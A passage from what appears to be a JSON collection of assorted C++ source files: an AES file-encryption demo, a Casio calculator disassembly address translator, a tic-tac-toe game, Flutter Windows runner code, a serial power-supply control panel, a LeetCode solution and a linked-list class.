writeToFile(const std::string& filename, const std::string& data) {\r\n    std::ofstream file(filename, std::ios::out | std::ios::binary);\r\n    if (!file) {\r\n        std::cerr << \"Error opening file for writing.\" << std::endl;\r\n        exit(EXIT_FAILURE);\r\n    }\r\n    file.write(data.c_str(), data.size());\r\n    file.close();\r\n}\r\n\r\n// Function to read binary data from a file\r\nvoid readFromFile(const std::string& filename, std::string& data) {\r\n    std::ifstream file(filename, std::ios::in | std::ios::binary);\r\n    if (!file) {\r\n        std::cerr << \"Error opening file for reading.\" << std::endl;\r\n        exit(EXIT_FAILURE);\r\n    }\r\n    file.seekg(0, std::ios::end);\r\n    std::streampos size = file.tellg();\r\n    file.seekg(0, std::ios::beg);\r\n    data.resize(size);\r\n    file.read(&data[0], size);\r\n    file.close();\r\n}\r\n\r\nint main() {\r\n    // Key and IV for AES\r\n    unsigned char key[AES_BLOCK_SIZE];\r\n    unsigned char iv[AES_BLOCK_SIZE];\r\n\r\n    // Generate a random AES key\r\n    generateAESKey(key, AES_BLOCK_SIZE);\r\n    generateAESKey(iv, AES_BLOCK_SIZE);\r\n\r\n    // Input plaintext\r\n    std::string plaintext = \"This is some very sensitive data that needs to be encrypted.\";\r\n\r\n    // Encrypt the plaintext\r\n    std::string ciphertext;\r\n    encryptAES(key, iv, plaintext, ciphertext);\r\n\r\n    // Write the encrypted data to a file\r\n    writeToFile(\"encrypted_data.bin\", ciphertext);\r\n\r\n    // Read the encrypted data from the file\r\n    std::string readCiphertext;\r\n    readFromFile(\"encrypted_data.bin\", readCiphertext);\r\n\r\n    // Decrypt the ciphertext\r\n    std::string decryptedText;\r\n    decryptAES(key, iv, readCiphertext, decryptedText);\r\n\r\n    // Display the original and decrypted text\r\n    std::cout << \"Original Text: \" << plaintext << std::endl;\r\n    std::cout << \"Decrypted Text: \" << decryptedText << std::endl;\r\n\r\n    return 0;\r\n}\r\n",
    "#include <vector>\r\n#include <map>\r\n#include <fstream>\r\n#include <iostream>\r\n#include <sstream>\r\n#include <algorithm>\r\n#include <string>\r\n\r\nusing namespace std;\r\n\r\nint hex2int(string hex_value) {\r\n  stringstream ss;\r\n  int rvalue;\r\n  ss << hex << hex_value;\r\n  ss >> rvalue;\r\n\r\n  return rvalue;\r\n}\r\n\r\nstring int2hex(int value) {\r\n  stringstream ss;\r\n  ss << hex << value;\r\n\r\n  return ss.str();\r\n}\r\n\r\nstruct Block\r\n{\r\n  string disas;\r\n  int last;\r\n  int offset = -1;\r\n  static Block empty() {\r\n    return Block { \"\", -1 };\r\n  }\r\n  bool isEmpty() {\r\n    return ((disas == \"\") && (last = -1));\r\n  }\r\n};\r\n\r\nvector<Block> _580vnx_blocks;\r\nvector<Block> _880btg_blocks;\r\nvector<Block> _991cnx_blocks;\r\nvector<Block> _991cncw_blocks;\r\nvector<Block> _jp900n_blocks;\r\nvector<Block> _570es_blocks;\r\nvector<Block> _570es_plus_blocks;\r\nmap<string, vector<Block>> blocks_map;\r\n\r\nvoid generate(string filename, vector<Block>* blocks) {\r\n  ifstream file(filename);\r\n  string context;\r\n\r\n  string disas;\r\n  string addr;\r\n  Block block;\r\n  while (getline(file, context)) {\r\n    int find = context.find(':');\r\n\r\n    int rvalue = hex2int(addr);\r\n    if (context == \"end\") {\r\n      if (disas.length() > 4) {\r\n        rvalue += (int)(disas.length() / 4);\r\n      }\r\n\r\n      block.last = rvalue;\r\n      blocks->push_back(block);\r\n\r\n      block = Block::empty();\r\n    }\r\n    else if (find != -1) {\r\n      // disas\r\n      addr = context.substr(0, 5);\r\n      disas = context.substr(5, context.find(':') - 5);\r\n\r\n      if (disas.length() > 4) {\r\n        for (int i = 4; i < disas.length(); i++) {\r\n          disas[i] = '0';\r\n        }\r\n      }\r\n\r\n      block.disas += disas;\r\n    }\r\n  }\r\n}\r\n\r\nstring getChain(vector<Block> blocks, int addr) {\r\n  for (Block block : blocks) {\r\n    int offset = block.last - addr;;\r\n    if (offset > 0 && offset < (int)(block.disas.length() / 2)) {\r\n      return block.disas.substr(block.disas.length() - 4 - (offset * 2), offset * 2 + 4);\r\n    }\r\n  }\r\n  return \"\\0\";\r\n}\r\n\r\ntuple<string, int> getFunctionChain(vector<Block> blocks, int addr) {\r\n  for (Block block : blocks) {\r\n    int offset = block.last - addr;\r\n    if (offset > 0 && offset < (int)(block.disas.length() / 2)) {\r\n      return tuple<string, int>(block.disas, offset);\r\n    }\r\n  }\r\n  return tuple<string, int>(\"\", -1);\r\n}\r\n\r\n// function vnx2cnx ready\r\n\r\nBlock translateFunction(vector<Block> blocksf, vector<Block> blockss, int addr) {\r\n  auto [func, offset] = getFunctionChain(blocksf, addr);\r\n  for (Block block : blockss) {\r\n    if (block.disas == func) {\r\n      block.offset = offset;\r\n      return block;\r\n    }\r\n  }\r\n  return Block::empty();\r\n}\r\n\r\nint translateByFunction(vector<Block> blocksf, vector<Block> blockss, int addr) {\r\n  Block block = translateFunction(blocksf, blockss, addr);\r\n  if (block.isEmpty()) return -1;\r\n\r\n  return block.last - block.offset;\r\n}\r\n\r\nvector<int> translateByChain(vector<Block> blocksf, vector<Block> blockss, int addr) {\r\n  vector<int> rAddrs;\r\n  string chain = getChain(blocksf, addr);\r\n\r\n  for (Block block : blockss) {\r\n    for (int i = 0; i < block.disas.length(); i += 4) {\r\n      if (block.disas.substr(i, block.disas.length() - i) == chain) {\r\n        int begin = block.last - (block.disas.length() / 2) + 2;\r\n        rAddrs.push_back(begin + i / 2);\r\n      }\r\n    }\r\n  }\r\n\r\n  return rAddrs;\r\n}\r\n\r\nint closest(vector<int> vect, int key) {\r\n  int temp = key;\r\n  int rvalue;\r\n\r\n  for (int i : vect) {\r\n    if (abs(i - key) < temp) {\r\n      temp = abs(i - key);\r\n      rvalue = i;\r\n    }\r\n  }\r\n\r\n  return rvalue;\r\n}\r\n\r\nvoid init() {\r\n  generate(\"./assets/fx580vnx_disas.txt\", &_580vnx_blocks);\r\n  generate(\"./assets/fx880btg_disas.txt\", &_880btg_blocks);\r\n  generate(\"./assets/fx991cnx_disas.txt\", &_991cnx_blocks);\r\n  generate(\"./assets/fx991cncw_disas.txt\", &_991cncw_blocks);\r\n  generate(\"./assets/fxjp900n_disas.txt\", &_jp900n_blocks);\r\n  generate(\"./assets/fx570es_disas.txt\", &_570es_blocks);\r\n  generate(\"./assets/fx570esplus_disas.txt\", &_570es_plus_blocks);\r\n\r\n  blocks_map = {\r\n    { \"580 VNX\", _580vnx_blocks },\r\n    { \"880 BTG\", _880btg_blocks },\r\n    { \"991 CNX\", _991cnx_blocks },\r\n    { \"991 CNCW\", _991cncw_blocks },\r\n    { \"JP900 N\", _jp900n_blocks },\r\n    { \"570 ES\", _570es_blocks },\r\n    { \"570 ES PLUS\", _570es_plus_blocks}\r\n  };\r\n}\r\n\r\nint main(int argc, char* argv[]) {\r\n  init();\r\n\r\n  vector<string> arguments(argv + 1, argv + argc);\r\n  for (string disas : arguments) {\r\n    for (const auto& kvx : blocks_map) {\r\n      string name_x = kvx.first;\r\n      vector<Block> blocks_x = kvx.second;\r\n\r\n      for (const auto& kvy : blocks_map) {\r\n        string name_y = kvy.first;\r\n        vector<Block> blocks_y = kvy.second;\r\n\r\n        if (name_x == name_y) continue;\r\n\r\n        string best_str = \" \\x1b[92m[best option]\\x1b[0m\";\r\n        vector<int> traned_disas = translateByChain(blocks_x, blocks_y, hex2int(disas));\r\n\r\n        int best_option = translateByFunction(blocks_x, blocks_y, hex2int(disas));\r\n        if (best_option == -1) {\r\n          best_option = clos",
    "#include<iostream>\r\nusing namespace std;\r\n\r\nconst int size = 3;\r\nchar board[size][size];\r\n\r\nvoid initializeboard() {\r\n    for (int i = 0; i < size; i++) {\r\n        for (int j = 0; j < size; j++) {\r\n            board[i][j] = ' ';\r\n        }\r\n    }\r\n}\r\n\r\nvoid displayboard()\r\n{\r\n    for(int i =0;i<size;i++)\r\n    {\r\n        for(int j=0;j<size;j++)\r\n        {  \r\n            cout<<board[i][j]<<\" \";\r\n        }\r\n        cout<<endl;\r\n    }\r\n}\r\n\r\n\r\nbool move(int row, int col, char player) {\r\n    if (row>=0&&row<size&&col>=0&&col<size&&board[row][col]==' ') {\r\n        board[row][col]=player;\r\n        return true;\r\n    }\r\n    return false;\r\n}\r\n\r\nbool win(char player) {\r\n    for (int i = 0; i < size; i++) {\r\n        if ((board[i][0]==player&&board[i][1]==player&&board[i][2]==player) ||(board[0][i]==player&&board[1][i]==player&&board[2][i]==player)) {\r\n            return true;\r\n        }\r\n    }\r\n    if ((board[0][0]==player&&board[1][1]==player&&board[2][2]==player) ||(board[0][2]==player&&board[1][1]==player&&board[2][0]==player)) {\r\n        return true;\r\n    }\r\n    return false;\r\n}\r\n\r\nbool draw() {\r\n    for (int i =0; i< size;i++) {\r\n    for (int j =0; j< size;j++) {\r\n     if (board[i][j]==' ') {\r\n         return false;\r\n        }\r\n        }\r\n    }\r\n    return true;\r\n}\r\n\r\nint main() {\r\n    char cplayer;\r\n    int row, col;\r\n    initializeboard();\r\n    displayboard();\r\n    \r\n    cout<<\"Enter the player name ie either X or O: \";\r\n    cin>>cplayer;\r\n    \r\n    if (cplayer!='X'&&cplayer!='O') {\r\n        cout<<\"Invalid player name\"<<endl;\r\n        return 1; \r\n    }\r\n    \r\n    while (true) {\r\n        cout<<\"Enter the row and col (between 0 and 2): \";\r\n        cin>>row>>col;\r\n        \r\n        if (row>=size||row<0||col>=size||col<0) {\r\n            cout << \"Array out of bounds, enter a valid value\" << endl;\r\n            continue; \r\n        }\r\n        \r\n        if (move(row, col, cplayer)) {\r\n            displayboard();\r\n            \r\n            if (win(cplayer)) {\r\n                cout<<\"Player \" << cplayer << \" wins!\" << endl;\r\n                break;\r\n            } else if (draw()) {\r\n                cout<<\"The game is a draw\" << endl;\r\n                break;\r\n            } else {\r\n                cplayer=(cplayer == 'X') ? 'O' : 'X';\r\n            }\r\n        } else {\r\n            cout<<\"Invalid move\" << endl;\r\n        }\r\n    }\r\n    \r\n    return 0;\r\n}\r\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"untitled2\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include <windows.h>\n#include <iostream>\n#include <vector>\n#include <string>\n#include <typeinfo>\n\n//\u00c3\u00eb\u00ee\u00e1\u00e0\u00eb\u00fc\u00ed\u00fb\u00e5 \u00ef\u00e5\u00f0\u00e5\u00ec\u00e5\u00ed\u00ed\u00fb\u00e5\nconst char g_szClassName[] = \"MainWindowClass\";\nHWND hComboBoxPort, hComboBoxBaudRate, hComboBoxByteSize, hComboBoxParity, hComboBoxStopBits, hButtonConnect, hLED;\nHWND hEditVoltage, hEditCurrent, hEditRiseTime, hEditFallTime, hEditMemoryBank;\nHWND hButtonSetVoltage, hButtonSetCurrent, hButtonSetRiseTime, hButtonSetFallTime, hButtonSaveSettings;\nHINSTANCE g_hInst;\nHANDLE hComPort = INVALID_HANDLE_VALUE; // \u00c4\u00e5\u00f1\u00ea\u00f0\u00e8\u00ef\u00f2\u00ee\u00f0 COM-\u00ef\u00ee\u00f0\u00f2\u00e0\n\nHWND hStaticVoltage, hStaticCurrent, hStaticMaxVoltage, hStaticMaxCurrent;\n\ndouble maxVoltage = 0.0;\ndouble maxCurrent = 0.0;\n\n//\u00cf\u00f0\u00ee\u00f2\u00ee\u00f2\u00e8\u00ef\u00fb \u00f4\u00f3\u00ed\u00ea\u00f6\u00e8\u00e9\nLRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam);\nvoid PopulateCOMPorts();\nvoid PopulateBaudRates();\nvoid PopulateByteSizes();\nvoid PopulateParities();\nvoid PopulateStopBits();\nvoid UpdateLED(int status);\n\n//\u00d4\u00f3\u00ed\u00ea\u00f6\u00e8\u00e8 \u00e4\u00eb\u00ff \u00f0\u00e0\u00e1\u00ee\u00f2\u00fb \u00f1 COM-\u00ef\u00ee\u00f0\u00f2\u00ee\u00ec\nbool OpenCOMPort(const char* portName);\nvoid CloseCOMPort();\nbool ConfigureCOMPort();\nbool WriteToCOMPort(const char* command);\nbool ReadFromCOMPort(char* buffer, int bufferSize);\n\n//\u00d4\u00f3\u00ed\u00ea\u00f6\u00e8\u00e8 \u00e4\u00eb\u00ff \u00f3\u00ef\u00f0\u00e0\u00e2\u00eb\u00e5\u00ed\u00e8\u00ff \u00e8\u00f1\u00f2\u00ee\u00f7\u00ed\u00e8\u00ea\u00ee\u00ec \u00ef\u00e8\u00f2\u00e0\u00ed\u00e8\u00ff\nvoid sendCommand(const std::string& command);\nbool SetOnDelay(double onDelay);\nbool SetOffDelay(double offDelay);\nbool EnableCurrentProtection(bool enable);\nbool EnableVoltageProtection(bool enable);\n\nvoid SetVoltage();\nvoid SetCurrent();\nvoid SetRiseTime();\nvoid SetFallTime();\nvoid SaveSettings();\n\n//\u00d4\u00f3\u00ed\u00ea\u00f6\u00e8\u00e8 \u00e4\u00eb\u00ff \u00f7\u00f2\u00e5\u00ed\u00e8\u00ff \u00e8 \u00f0\u00e5\u00e3\u00e8\u00f1\u00f2\u00f0\u00e0\u00f6\u00e8\u00e8 \u00e7\u00ed\u00e0\u00f7\u00e5\u00ed\u00e8\u00e9\nbool GetVoltage(double& voltage);\nbool GetCurrent(double& current);\nvoid RegisterMinMaxValues(double voltage, double current);\n\n//\u00d4\u00f3\u00ed\u00ea\u00f6\u00e8\u00e8 \u00e4\u00eb\u00ff \u00e3\u00f0\u00e0\u00f4\u00e8\u00f7\u00e5\u00f1\u00ea\u00ee\u00e3\u00ee \u00e8\u00ed\u00f2\u00e5\u00f0\u00f4\u00e5\u00e9\u00f1\u00e0\nvoid CreateMainWindow();\nvoid UpdateDisplay();\nvoid VisualizeCurrent();\nvoid UpdateLED(int ledID, int status);\n\nint WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {\n    WNDCLASSEX wc;\n    HWND hwnd;\n    MSG Msg;\n\n    // \u00c8\u00ed\u00e8\u00f6\u00e8\u00e0\u00eb\u00e8\u00e7\u00e0\u00f6\u00e8\u00ff \u00f1\u00f2\u00f0\u00f3\u00ea\u00f2\u00f3\u00f0\u00fb WNDCLASSEX\n    wc.cbSize        = sizeof(WNDCLASSEX);\n    wc.style         = 0;\n    wc.lpfnWndProc   = WndProc;\n    wc.cbClsExtra    = 0;\n    wc.cbWndExtra    = 0;\n    wc.hInstance     = hInstance;\n    wc.hIcon         = LoadIcon(NULL, IDI_APPLICATION);\n    wc.hCursor       = LoadCursor(NULL, IDC_ARROW);\n    wc.hbrBackground = (HBRUSH)(COLOR_WINDOW+1);\n    wc.lpszMenuName  = NULL;\n    wc.lpszClassName = g_szClassName;\n    wc.hIconSm       = LoadIcon(NULL, IDI_APPLICATION);\n\n    // \u00d0\u00e5\u00e3\u00e8\u00f1\u00f2\u00f0\u00e0\u00f6\u00e8\u00ff \u00ee\u00ea\u00ee\u00ed\u00ed\u00ee\u00e3\u00ee \u00ea\u00eb\u00e0\u00f1\u00f1\u00e0\n    if(!RegisterClassEx(&wc)) {\n        MessageBox(NULL, \"Window Registration Failed!\", \"Error\", MB_ICONEXCLAMATION | MB_OK);\n        return 0;\n    }\n\n    // \u00d1\u00ee\u00e7\u00e4\u00e0\u00ed\u00e8\u00e5 \u00e3\u00eb\u00e0\u00e2\u00ed\u00ee\u00e3\u00ee \u00ee\u00ea\u00ed\u00e0\n    hwnd = CreateWindowEx(\n        WS_EX_CLIENTEDGE,\n        g_szClassName,\n        \"Power Supply Control Panel, 4160\",\n        WS_OVERLAPPEDWINDOW,\n        CW_USEDEFAULT, CW_USEDEFAULT, 800, 600,\n        NULL, NULL, hInstance, NULL);\n\n    if(hwnd == NULL) {\n        MessageBox(NULL, \"Window Creation Failed!\", \"Error\", MB_ICONEXCLAMATION | MB_OK);\n        return 0;\n    }\n\n    ShowWindow(hwnd, nCmdShow);\n    UpdateWindow(hwnd);\n\n    // \u00d6\u00e8\u00ea\u00eb \u00f1\u00ee\u00ee\u00e1\u00f9\u00e5\u00ed\u00e8\u00e9\n    while(GetMessage(&Msg, NULL, 0, 0) > 0) {\n        TranslateMessage(&Msg);\n        DispatchMessage(&Msg);\n    }\n\n    return Msg.wParam;\n}\n\nLRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {\n    switch(msg) {\n        case WM_CREATE:\n            {\n            // \u00d1\u00ee\u00e7\u00e4\u00e0\u00ed\u00e8\u00e5 ComboBox \u00e4\u00eb\u00ff \u00e2\u00fb\u00e1\u00ee\u00f0\u00e0 COM-\u00ef\u00ee\u00f0\u00f2\u00e0\n            hComboBoxPort = CreateWindow(\"COMBOBOX\", NULL,\n                CBS_DROPDOWN | CBS_HASSTRINGS | WS_CHILD | WS_OVERLAPPED | WS_VISIBLE,\n                50, 50, 150, 200, hwnd, NULL, g_hInst, NULL);\n            PopulateCOMPorts();\n\n            // \u00d1\u00ee\u00e7\u00e4\u00e0\u00ed\u00e8\u00e5 ComboBox \u00e4\u00eb\u00ff \u00e2\u00fb\u00e1\u00ee\u00f0\u00e0 \u00f1\u00ea\u00ee\u00f0\u00ee\u00f1\u00f2\u00e8 \u00ef\u00e5\u00f0\u00e5\u00e4\u00e0\u00f7\u00e8 \u00e4\u00e0\u00ed\u00ed\u00fb\u00f5\n            hComboBoxBaudRate = CreateWindow(\"COMBOBOX\", NULL,\n                CBS_DROPDOWN | CBS_HASSTRINGS | WS_CHILD | WS_OVERLAPPED | WS_VISIBLE,\n                50, 100, 150, 200, hwnd, NULL, g_hInst, NULL);\n            PopulateBaudRates();\n\n            // \u00d1\u00ee\u00e7\u00e4\u00e0\u00ed\u00e8\u00e5 ComboBox \u00e4\u00eb\u00ff \u00e2\u00fb\u00e1\u00ee\u00f0\u00e0 \u00f0\u00e0\u00e7\u00ec\u00e5\u00f0\u00e0 \u00e1\u00e0\u00e9\u00f2\u00e0\n            hComboBoxByteSize = CreateWindow(\"COMBOBOX\", NULL,\n                CBS_DROPDOWN | CBS_HASSTRINGS | WS_CHILD | WS_OVERLAPPED | WS_VISIBLE,\n                50, 150, 150, 200, hwnd, NULL, g_hInst, NULL);\n            PopulateByteSizes();\n\n            // \u00d1\u00ee\u00e7\u00e4\u00e0\u00ed\u00e8\u00e5 ComboBox \u00e4\u00eb\u00ff \u00e2\u00fb\u00e1\u00ee\u00f0\u00e0 \u00ef\u00f0\u00ee\u00e2\u00e5\u00f0\u00ea\u00e8 \u00f7\u00e5\u00f2\u00ed\u00ee\u00f1\u00f2\u00e8\n            hComboBoxParity = CreateWindow(\"COMBOBOX\", NULL,\n                CBS_DROPDOWN | CBS_HASSTRINGS | WS_CHILD | WS_OVERLAPPED | WS_VISIBLE,\n                50, 200, 150, 200, hwnd, NULL, g_hInst, NULL);\n            PopulateParities();\n\n            // \u00d1\u00ee\u00e7\u00e4\u00e0\u00ed\u00e8\u00e5 ComboBox \u00e4\u00eb\u00ff \u00e2\u00fb\u00e1\u00ee\u00f0\u00e0 \u00f1\u00f2\u00ee\u00ef-\u00e1\u00e8\u00f2\u00ee\u00e2\n            hComboBoxStopBits = CreateWindow(\"COMBOBOX\", NULL,\n                CBS_DROPDOWN | CBS_HASSTRINGS | WS_CHILD | WS_OVERLAPPED | WS_VISIBLE,\n                50, 250, 150, 200, hwnd, NULL, g_hInst, NULL);\n            PopulateStopBits();\n\n            // \u00d1\u00ee\u00e7\u00e4\u00e0\u00ed\u00e8\u00e5 \u00ea\u00ed\u00ee\u00ef\u00ea\u00e8 Connect\n            hButtonCo",
    "/*\n    40. Combination Sum II\n\n    Given a collection of candidate numbers (candidates) and a target number (target), find all unique combinations in candidates where the candidate numbers sum to target.\n    Each number in candidates may only be used once in the combination.\n\n    Note: The solution set must not contain duplicate combinations.\n\n*/\n\n// Solution : Recursion\n\nclass Solution {\npublic:\n\n    void findCombination(int ind, int target, vector<int>& arr, vector<vector<int>>& ans, vector<int>& ds) {\n        if(target == 0) {\n            ans.push_back(ds);\n            return;\n        }\n\n        for(int i = ind ; i < arr.size() ; i++) {\n            if( i > ind && arr[i] == arr[i - 1]) continue;\n            if(arr[i] > target) break;\n            ds.push_back(arr[i]);\n\n            findCombination(i + 1, target - arr[i], arr, ans, ds);\n            ds.pop_back();\n        }\n    }\n\n    vector<vector<int>> combinationSum2(vector<int>& candidates, int target) {\n        sort(candidates.begin(), candidates.end());\n\n        vector<vector<int>> ans;\n        vector<int> ds;\n\n        findCombination(0, target, candidates, ans, ds);\n        return ans;\n    }\n};\n\n/*\n    Time Complexity: O(2^n * k )    k = average length of every combination\n    Space Complexity: O(k * x)   x = number of combination\n*/",
    "#include<iostream>\n#include<list>\nusing namespace std;\n\nint main(){\n\n    int arr[4]={199,200,201,202};\n\n    // Basic 'For' loop\n    cout<<\"OP Line 1 - \";\n    for(int i=0;i<4;i++){\n        cout<<&arr[i]<<\" \";\n    }\n    cout<<endl;\n\n    // Range base 'For' loop\n    cout<<\"OP Line 2 - \";\n    for(int i:arr){\n        cout<<i<<\" \";\n    }\n    cout<<endl;\n\n    /*\n    The range-based for loop in C++ is a convenient syntax for iterating over all elements in a container (such as arrays, vectors, lists, etc.).\n\n    for (int i:arr) | for (_decleration_:_container_)\n    \u2022\tdeclaration: This is typically a variable that will hold each element of the container in turn.\n\t\u2022\tcontainer: This is the container or range you are iterating over.\n\n    \u2022\tint i: Declares an integer variable i that will take on the value of each element in arr during each iteration of the loop.\n\t\u2022\tarr: The array over which we are iterating.\n\n    In a range-based for loop, the address of the loop variable (e.g., i) remains the same for each iteration because the variable is reused. Its value changes with each element of the container, but its address stays constant within the loop block.\n    */\n\n    cout<<\"OP Line 3 - \";\n    for(int &i:arr){\n        cout<<&i<<\" \";\n    }\n    cout<<endl;\n    \n\n    // Character String\n    cout<<\"OP Line 4 - \";\n    char arr2[]={'a','b','0',0,'c','d'};\n    cout<<arr2;\n\n        cout<<endl;\n\n    cout<<\"OP Line 5 - \";\n    char arr3[]=\"abh\";\n    for(int i=0;arr3[i]!=0;i++){\n        cout<<arr3[i];\n    }\n    /*\n    1.\tCharacter Arrays:\n\t\u2022\tchar arr2[] = {'a', 'b', '0', 0, 'c', 'd'};\n\t\u2022\tThis initializes a character array arr2 with the characters 'a', 'b', '0', and 'c', 'd' but with a null terminator (0) placed in the array. The null terminator (0 or '\\0') marks the end of the string. When cout << arr2 is used, it prints characters up to the null terminator. So, arr2 prints \u201cab0\u201d.\n\t\u2022\tchar arr3[] = \"abh\";\n\t\u2022\tThis initializes a character array arr3 with the string \"abh\". The compiler automatically adds a null terminator ('\\0') at the end, making the actual array content {'a', 'b', 'h', '\\0'}.\n\n    2.\tEscape Sequence:\n\t\u2022\t'\\0' (or 0) is the null terminator used to mark the end of a C-style string. It signals the end of the string to functions like cout that print strings.\n\n    3.\tPrinting Whole String:\n\t\u2022\tcout << arr2;\n\t\u2022\tPrints the characters in arr2 up to the null terminator. In your case, it prints \u201cab0\u201d.\n\t\u2022\tfor (int i = 0; arr3[i] != 0; i++) { cout << arr3[i]; }\n\t\u2022\tThis loop iterates over each character in arr3 until it encounters the null terminator (0). It prints each character individually. Since arr3 is initialized as \"abh\", it prints \u201cabh\u201d.\n\n    */\n    return 0;\n\n}\n",
    "//Write the application to create Standard Templete Library(STL) \r\n//which contains all the inbuild functions of Data structures \r\n\r\n#include<iostream>\r\nusing namespace std;\r\n\r\n////////////////////////////////////////////////////////////////////////////////////////////////////////\r\n//\r\n//  DS Name      :      Singly Linear Linked List\r\n//  Description  :      Implimentation of All the methods of Data structures of Singly Linear LinkedList\r\n//  Author       :      Om Pramod Nikam\r\n//  Date         :      04/08/2024\r\n//\r\n////////////////////////////////////////////////////////////////////////////////////////////////////////\r\n\r\n\r\ntemplate <class T>\r\nstruct nodeSL \r\n{\r\n    T data;\r\n    struct nodeSL* next;\r\n};\r\n\r\ntemplate <class T>\r\nclass SinglyLL\r\n{\r\n    private :\r\n        struct nodeSL <T> * First;\r\n        int iCount;\r\n\r\n    public :\r\n        SinglyLL();\r\n        void Display();\r\n        int Count();\r\n        void InsertFirst(T No);\r\n        void InsertLast(T No);\r\n        void InsertAtPos(T No, int iPos);\r\n        void DeleteFirst();\r\n        void DeleteLast();\r\n        void DeleteAtPos(int iPos);\r\n};\r\n\r\ntemplate <class T>\r\nSinglyLL <T> :: SinglyLL()\r\n{\r\n    First = NULL;\r\n    iCount = 0;\r\n}\r\n\r\ntemplate <class T>\r\nvoid SinglyLL <T> :: Display()\r\n{\r\n    struct nodeSL <T> * temp = NULL;\r\n    temp = First;\r\n\r\n    while(temp != NULL)\r\n    {\r\n        cout<<\"| \"<<temp->data<<\" | -> \";\r\n        temp = temp ->next;\r\n    }\r\n    cout<<\"NULL\\n\";\r\n}\r\n\r\ntemplate <class T>\r\nint SinglyLL <T> :: Count()\r\n{\r\n    return iCount;\r\n}\r\n\r\ntemplate <class T>\r\nvoid SinglyLL <T> :: InsertFirst(T No)\r\n{\r\n    struct nodeSL <T> * newn = NULL;\r\n    newn = new nodeSL <T> ;\r\n    \r\n    newn ->data = No;\r\n    newn ->next = NULL;\r\n\r\n    if(First == NULL)\r\n    {\r\n        First = newn;\r\n    }\r\n    else\r\n    {\r\n        newn->next = First;\r\n        First = newn;\r\n    }\r\n    iCount++;\r\n}\r\n\r\ntemplate <class T>\r\nvoid SinglyLL <T> :: InsertLast(T No)\r\n{\r\n    struct nodeSL <T> * newn = NULL;\r\n    newn = new nodeSL <T> ;\r\n\r\n    struct nodeSL <T> * temp = NULL;\r\n    \r\n    newn ->data = No;\r\n    newn ->next = NULL;\r\n\r\n    if(First == NULL)\r\n    {\r\n        First = newn;\r\n    }\r\n    else\r\n    {\r\n        temp = First;\r\n\r\n        while(temp->next != NULL)\r\n        {\r\n            temp = temp ->next;\r\n        }\r\n        temp ->next = newn;\r\n    }\r\n    iCount++;\r\n}\r\n\r\ntemplate <class T>\r\nvoid SinglyLL <T> :: InsertAtPos(T No, int iPos)\r\n{\r\n    struct nodeSL <T> * newn = NULL;\r\n    struct nodeSL <T> * temp = NULL;\r\n    int iLength = 0;\r\n    int i = 0;\r\n\r\n    newn = new nodeSL <T> ;\r\n    newn ->data = No;\r\n    newn ->next = NULL;\r\n\r\n    iLength = Count();\r\n\r\n    if(iPos == 1)\r\n    {\r\n        InsertFirst(No);\r\n    }\r\n    else if(iPos == (iLength+1))\r\n    {\r\n        InsertLast(No);\r\n    }\r\n    else\r\n    {\r\n        temp = First;\r\n\r\n        for(i = 1 ; i < iPos-1 ; i++)\r\n        {\r\n            temp = temp ->next;\r\n        }\r\n\r\n        newn->next = temp->next;\r\n        temp->next = newn;\r\n\r\n        iCount++;\r\n    }\r\n}\r\n\r\ntemplate <class T>\r\nvoid SinglyLL <T> :: DeleteFirst()\r\n{    \r\n    struct nodeSL <T> * temp = NULL;\r\n\r\n    if(First == 